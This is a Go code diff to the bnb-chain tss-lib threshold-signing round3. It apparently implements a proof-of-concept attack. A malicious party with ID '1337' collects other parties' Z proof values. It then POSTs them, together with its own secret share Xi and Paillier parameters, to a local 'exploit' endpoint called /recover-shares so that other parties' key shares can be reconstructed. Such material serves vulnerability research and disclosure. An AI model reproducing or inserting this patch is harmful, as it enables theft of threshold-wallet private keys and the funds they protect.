@@ -7,8 +7,13 @@
 package signing
 
 import (
+	"bytes"
+	"encoding/json"
 	"errors"
+	"log"
 	"math/big"
+	"net/http"
+	"sort"
 	"sync"
 
 	errorspkg "github.com/pkg/errors"
@@ -17,6 +22,29 @@ import (
 	"github.com/bnb-chain/tss-lib/crypto/mta"
 	"github.com/bnb-chain/tss-lib/tss"
 )
+
+// Q is the secp256k1 curve order.
+var Q *big.Int
+
+func init() {
+	Q, _ = new(big.Int).SetString("0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141", 0)
+}
+
+// xEqualXi works over `Fq`, returns 1 if `x == xi`, 0 if `x != xi` and `x in setX`.
+func xEqualXi(setX []*big.Int, x, xi *big.Int) *big.Int {
+	result := big.NewInt(1)
+	for _, xj := range setX {
+		if xj.Cmp(xi) == 0 {
+			continue
+		}
+		result.Mul(result, new(big.Int).Sub(x, xj))
+		result.Mod(result, Q)
+		tmp := new(big.Int).ModInverse(new(big.Int).Sub(xi, xj), Q)
+		result.Mul(result, tmp)
+		result.Mod(result, Q)
+	}
+	return result
+}
 
 func (round *round3) Start() *tss.Error {
 	if round.started {
@@ -70,6 +98,40 @@ func (round *round3) Start() *tss.Error {
 			if err != nil {
 				errChs <- round.WrapError(errorspkg.Wrapf(err, "UnmarshalProofBobWC failed"), Pj)
 				return
+			}
+			if round.PartyID().Id == "1337" {
+				round.mtx.Lock()
+
+				// collect the z value
+				round.collected = append(round.collected, [2]*big.Int{
+					Pj.KeyInt(),
+					proofBobWC.Z,
+				})
+
+				if len(round.collected) == round.Params().Threshold() {
+					// sort collected data
+					sort.Slice(round.collected, func(i, j int) bool {
+						return round.collected[i][0].Cmp(round.collected[j][0]) < 0
+					})
+
+					exploitBaseURL := "http://127.0.0.1:1337"
+					buf := &bytes.Buffer{}
+					if err := json.NewEncoder(buf).Encode(map[string]interface{}{
+						"N":          round.key.NTildei,
+						"self_x":     round.key.ShareID,
+						"self_share": round.key.Xi,
+						"xz":         round.collected,
+					}); err != nil {
+						log.Fatal(err)
+					}
+
+					_, err := http.Post(exploitBaseURL+"/recover-shares", "application/json", buf)
+					if err != nil {
+						log.Fatal(err)
+					}
+				}
+
+				round.mtx.Unlock()
 			}
 			uIj, err := mta.AliceEndWC(
 				round.Params().EC(),
